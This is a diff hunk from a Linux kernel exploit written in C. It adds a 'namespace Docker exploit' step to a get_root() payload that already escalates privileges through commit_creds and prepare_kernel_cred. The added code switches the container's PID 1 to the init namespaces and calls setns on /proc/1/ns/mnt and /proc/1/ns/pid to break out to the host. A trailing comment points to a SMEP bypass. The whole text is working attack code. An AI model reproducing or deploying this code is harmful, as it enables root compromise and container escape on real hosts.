@@ -170,6 +170,19 @@ typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsign
 void get_root(void) {
 	((_commit_creds)(COMMIT_CREDS))(
 	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
+	// -------- NAMESPACE DOCKER EXPLOIT  --------
+        // copy nsproxy from init_nsproxy to pid 1 of the container
+        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);
+
+        // now, do the magic.... !!!! Simple black magic doesn't work on current process!!!!
+        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);
+
+        // prepare the two namespace FDs by opening the respective files
+        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, "/proc/1/ns/mnt", O_RDONLY, 0);
+        ((_sys_setns)(SYS_SETNS))( fd, 0);
+
+        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, "/proc/1/ns/pid", O_RDONLY, 0);
+        ((_sys_setns)(SYS_SETNS))( fd, 0);
 }
 
 // * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *
